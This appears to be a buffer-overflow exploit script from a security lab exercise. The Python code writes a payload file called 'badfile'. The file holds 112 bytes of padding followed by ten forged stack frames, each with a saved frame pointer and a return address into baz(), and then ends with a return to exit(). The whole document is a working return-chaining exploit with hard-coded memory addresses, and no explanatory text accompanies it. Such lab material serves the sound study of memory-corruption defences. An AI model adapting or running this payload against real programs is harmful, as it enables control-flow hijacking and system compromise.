#!/usr/bin/python3
import sys

def tobytes (value):
    return (value).to_bytes(4, byteorder='little')

baz_skip_addr = 0x5655631c    # Address of baz() + 7
exit_addr     = 0xf7e04f80    # Address of exit()
ebp_foo       = 0xffffc9d8    # ebp value of the current stack frame

content = bytearray(0xaa for i in range(112))

ebp_next = ebp_foo
for i in range(10):
    ebp_next += 0x20
    content += tobytes(ebp_next)        # Next ebp value
    content += tobytes(baz_skip_addr)   # Return address
    content += tobytes(0xAABBCCDD)      # Fist argument
    content += b'A' * (0x20 - 3*4)      # Fill up the frame

content += tobytes(0xFFFFFFFF)  # Next ebp value (never used)
content += tobytes(exit_addr)   # Return address
content += tobytes(0xAABBCCDD)  # First argument

# Write the content to a file
with open("badfile", "wb") as f:
    f.write(content)
